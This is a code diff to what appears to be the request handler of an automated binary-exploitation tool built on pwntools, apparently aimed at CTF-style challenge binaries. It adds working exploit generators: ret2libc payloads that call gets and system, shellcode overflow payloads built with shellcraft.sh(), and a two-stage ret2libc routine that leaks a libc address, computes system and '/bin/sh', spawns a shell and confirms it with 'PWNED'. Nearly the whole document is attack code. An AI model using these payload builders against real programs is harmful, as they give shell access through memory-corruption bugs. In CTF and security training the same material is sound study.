@@ -86,9 +86,17 @@ def _handle(request: dict) -> dict:
     op = request.get("op")
     try:
         if op == "ping":
-            from importlib.metadata import version
+            from importlib.metadata import PackageNotFoundError, version
 
-            return {"ok": True, "data": {"version": version("pwntools")}}
+            tools = {}
+            for name in ("pwntools", "ropgadget", "capstone", "pyelftools",
+                         "LibcSearcher"):
+                try:
+                    tools[name] = version(name)
+                except PackageNotFoundError:
+                    tools[name] = None
+            return {"ok": True, "data": {"version": tools.get("pwntools"),
+                                         "tools": tools}}
         if op == "gadgets":
             elf = _elf(request["path"])
             rop = ROP(elf)
@@ -98,6 +106,150 @@ def _handle(request: dict) -> dict:
             ]
             gadgets.sort(key=lambda item: item["address"])
             return {"ok": True, "data": {"count": len(gadgets), "gadgets": gadgets[:300]}}
+        if op == "ret2libc_bss":
+            from pwn import p32, p64
+
+            elf = _elf(request["path"])
+            gets = elf.plt.get("gets")
+            system = elf.plt.get("system")
+            bss = int(request.get("bss") or elf.symbols.get("buf2") or elf.bss())
+            offsets = [int(value) for value in request["offsets"]]
+            if gets is None or system is None:
+                return {"ok": True, "data": {"payloads": [], "missing": ["gets/system"]}}
+            if elf.bits == 32:
+                payloads = [b"A" * offset + p32(gets) + p32(system) + p32(bss) + p32(bss)
+                            for offset in offsets]
+            else:
+                rop = ROP(elf)
+                pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
+                payloads = [b"A" * offset + p64(pop_rdi) + p64(bss) + p64(gets)
+                            + p64(pop_rdi) + p64(bss) + p64(system)
+                            for offset in offsets]
+            return {"ok": True, "data": {
+                "payloads": [payload.hex() for payload in payloads],
+                "offsets": offsets, "missing": []}}
+        if op == "shellcode_chain":
+            from pwn import asm, p32, p64, shellcraft
+
+            elf = _elf(request["path"])
+            context.arch = "i386" if elf.bits == 32 else "amd64"
+            shellcode = asm(shellcraft.sh())
+            bss = int(request.get("bss") or elf.symbols.get("buf2") or elf.bss())
+            pack = p32 if elf.bits == 32 else p64
+            offsets = [int(value) for value in request["offsets"]]
+            payloads = []
+            for offset in offsets:
+                padding = offset - len(shellcode)
+                if padding < 0:
+                    continue
+                payloads.append(shellcode + b"A" * padding + pack(bss))
+            return {"ok": True, "data": {
+                "payloads": [payload.hex() for payload in payloads],
+                "offsets": offsets[:len(payloads)],
+                "shellcode_len": len(shellcode), "missing": []}}
+        if op == "ret2libc_leak":
+            from pwn import ELF, p32, p64, u32, u64
+
+            elf = _elf(request["path"])
+            libc = (ELF(request["libc_path"], checksec=False)
+                    if request.get("libc_path") else elf.libc)
+            leak_symbol = request.get("leak_symbol", "puts")
+            got = elf.got.get(leak_symbol)
+            plt = elf.plt.get(leak_symbol)
+            main = elf.symbols.get("main")
+            if got is None or plt is None or main is None:
+                return {"ok": True, "data": {"solved": False,
+                                             "error": "leak_symbol_missing"}}
+            pack = p32 if elf.bits == 32 else p64
+            unpack = u32 if elf.bits == 32 else u64
+            offsets = [int(value) for value in request["offsets"]]
+            width = 4 if elf.bits == 32 else 8
+            started = time.perf_counter()
+            debug_log = []
+
+            def open_and_leak(leak_offset: int):
+                io = process(elf.path, aslr=bool(request.get("aslr", True)))
+                io.recvuntil(b"!?", timeout=2)
+                payload = b"A" * leak_offset + pack(plt) + pack(main) + pack(got)
+                io.sendline(payload)
+                raw = io.recvuntil(b"\n", timeout=2) or b""
+                leak = 0
+                for start in range(0, max(0, len(raw) - width + 1), 1):
+                    value = unpack(raw[start:start + width])
+                    if not (0xF0000000 <= value <= 0xFFFFFFFF):
+                        continue
+                    base = value - libc.symbols[leak_symbol]
+                    if base % 0x1000 == 0 and 0 < base < 0x100000000:
+                        leak = value
+                        break
+                return io, leak
+
+            # 第一遍：找能成功泄漏的偏移
+            leak_offset = None
+            for candidate in offsets:
+                io = None
+                try:
+                    io, leak = open_and_leak(candidate)
+                    debug_log.append((candidate, "leak", hex(leak) if leak else 0))
+                    if leak:
+                        leak_offset = candidate
+                        break
+                except Exception as error:  # noqa: BLE001
+                    debug_log.append((candidate, "ERR", type(error).__name__))
+                    continue
+                finally:
+                    if io is not None:
+                        try:
+                            io.close()
+                        except Exception:  # noqa: BLE001
+                            pass
+            if leak_offset is None:
+                return {"ok": True, "data": {
+                    "solved": False, "error": "leak_not_found",
+                    "debug_log": debug_log[-10:],
+                    "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+
+            # 第二遍：泄漏与第二阶段在同一个进程里完成；第二阶段偏移单独试，
+            # 因为 main 重入后栈对齐可能和第一次不同。
+            for stage2_offset in offsets:
+                io = None
+                try:
+                    io, leak = open_and_leak(leak_offset)
+                    if not leak:
+                        continue
+                    base = leak - libc.symbols[leak_symbol]
+                    system = base + libc.symbols["system"]
+                    shell = next(iter(libc.search(b"/bin/sh")), None)
+                    if shell is None:
+                        return {"ok": True, "data": {"solved": False,
+                                                     "error": "binsh_missing"}}
+                    shell += base
+                    io.recvuntil(b"!?", timeout=2)
+                    stage2 = b"A" * stage2_offset + pack(system) + pack(0) + pack(shell)
+                    io.sendline(stage2)
+                    time.sleep(0.2)
+                    io.send(b"echo PWNED; exit\n")
+                    output = io.recvall(timeout=4) or b""
+                    text = output.decode("utf-8", "replace")
+                    if "PWNED" in text:
+                        return {"ok": True, "data": {
+                            "solved": True, "offset": stage2_offset,
+                            "leak_offset": leak_offset, "leak": leak,
+                            "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+                except Exception as error:  # noqa: BLE001 - 错偏移会崩，继续试下一个
+                    debug_log.append((stage2_offset, "ERR", type(error).__name__,
+                                      str(error)[:40]))
+                    continue
+                finally:
+                    if io is not None:
+                        try:
+                            io.close()
+                        except Exception:  # noqa: BLE001
+                            pass
+            return {"ok": True, "data": {
+                "solved": False, "attempts": len(offsets),
+                "debug_log": debug_log[-20:],
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
         if op == "execve_chain":
             from pwn import p32, p64
 
@@ -247,8 +399,14 @@ def _handle(request: dict) -> dict:
                     io = process(elf.path)
                     io.send(payload + b"\n")
                     if post:
-                        time.sleep(0.05)
-                        io.send(post)
+                        # 分阶段发送：链里可能有第二次 gets，stdio 会把多余的
+                        # 输入缓冲在父进程里，shell 读不到；必须等它消费后再发。
+                        time.sleep(0.2)
+                        for line in post.split(b"\n"):
+                            if not line:
+                                continue
+                            io.send(line + b"\n")
+                            time.sleep(0.25)
                     output = io.recvall(timeout=timeout) or b""
                 except Exception:  # noqa: BLE001 - 错误偏移导致崩溃时继续试下一个
                     output = b""
